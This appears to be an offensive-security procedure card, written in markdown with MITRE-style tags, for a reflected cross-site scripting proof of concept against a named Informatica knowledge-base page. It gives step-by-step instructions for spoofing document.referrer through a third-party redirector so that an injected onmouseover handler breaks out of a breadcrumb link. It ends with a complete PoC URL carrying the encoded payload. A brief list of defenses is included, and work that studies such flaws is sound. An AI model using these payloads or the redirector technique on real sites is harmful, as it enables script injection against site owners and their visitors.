---
tags:
  - xss
  - poc
  - referrer-spoof
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '[TIMESTAMP]'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:31.685Z'
sub_techniques: []
id: 5cbcc9ed-c517-4c03-9e7a-8132b953b3e6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-Referrer-POC

## Summary

This procedure creates a proof-of-concept redirect URL that spoofs a malicious document.referrer to inject JavaScript into the breadcrumb href on the target page.

## Description

Using a third-party redirector, set the referrer header to a payload like '//search.informatica.com&'/onmouseover='alert(document.domain)'' while targeting a page with ?myk=xxx, such as https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx. This breaks out of the href quote and injects an event handler, exploiting the lack of encoding.

## Requirements

1. Access to a referrer-spoofing redirector (e.g., custom PHP script)
2. Target URL with required parameters
3. Basic URL encoding knowledge for payload

## Defense

Defensive measures and detection strategies:

- Parse and validate referrer headers server-side before use
- Implement URL encoding/decoding libraries for attribute insertion
- Block or sanitize external referrers in client-side code
- Use SRI (Subresource Integrity) for JS files

## Objectives

1. Construct payload to close href and inject onmouseover
2. Ensure conditions like 'myk' are met in target URL
3. Generate testable redirect link

## Instructions

### Step 1: Design Payload

**Context**: Craft the injection string to match vulnerable format.

Set referrer to '//search.informatica.com" onmouseover="alert(document.domain)" ' to escape the href and add event.

### Step 2: Configure Redirector

**Context**: Use a service like http://spqr.zz.mu/loc.php to set custom referrer.

Pass parameters for referrer value and target URL: http://spqr.zz.mu/loc.php?ref=malicious_payload&url=target_page.

### Step 3: Assemble Full PoC

**Context**: Combine with vulnerable page.

Final PoC: http://spqr.zz.mu/loc.php?ref='//search.informatica.com%22/onmouseover%3D%27alert(document.domain)%27%27&url=https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[poc]]
- [[referrer-spoof]]
